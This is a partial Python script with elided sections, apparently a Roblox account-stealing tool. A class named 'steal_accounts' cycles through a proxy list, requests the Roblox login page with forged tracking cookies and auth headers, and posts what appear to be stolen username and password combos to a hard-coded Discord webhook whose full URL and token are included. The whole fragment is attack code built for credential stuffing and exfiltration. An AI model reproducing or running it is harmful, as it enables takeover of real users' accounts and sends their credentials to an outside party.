...
shitproxies = open("shitproxies.txt").read().splitlines()
...
class steal_accounts():
    ...
    def check_account(self):
        ...
        response = self.client.get('https://www.roblox.com/login', headers=headers)

        cookies = {
    'GuestData': response.cookies["GuestData"],
    '_gcl_au': '1.1.1356037254.1711783767',
    'RBXSource': 'rbx_acquisition_time=3/30/2024 2:29:33 AM&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    'RBXEventTrackerV2': response.cookies["RBXEventTrackerV2"],
    '__utma': '200924205.342063034.1711783778.1714138306.1714149592.22',
    '__utmc': '200924205',
    '__utmz': '200924205.1714149592.22.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    'RBXImageCache': 'timg=ir-z10wln18RVlTZzycPKRHWsXwLrQVs2litqFy0gEbp86ET2pui-2PvE_ZAnRWhzFOIA8NUZu3PsSNd__LcFDKMeooLdhaUtB03ZW3H0c6iVQrAWM8t8nIVf4X9KUwbCqCGBEf-mRHAYV_4_u7erd77grvtLbs5sjPyNJiCI_CyrtLpuFhSNTqRVRFOL1nGrM3fSK9308thiVwi9eu9yg',
    'rbx-ip2': '1',
}
        headers = {
            "authority": "auth.roblox.com",
        ...
        try:
            ...
            webhook1 = DiscordWebhook(url="https://discord.com/api/webhooks/1233463236880236655/60aMInzVfyTlhBztyt7K2srrDBZCxKH6Z4yKuovjui447EErLOZwCJf9LoTWoyzZTgmb", content=comboss)
            webhook1.execute()
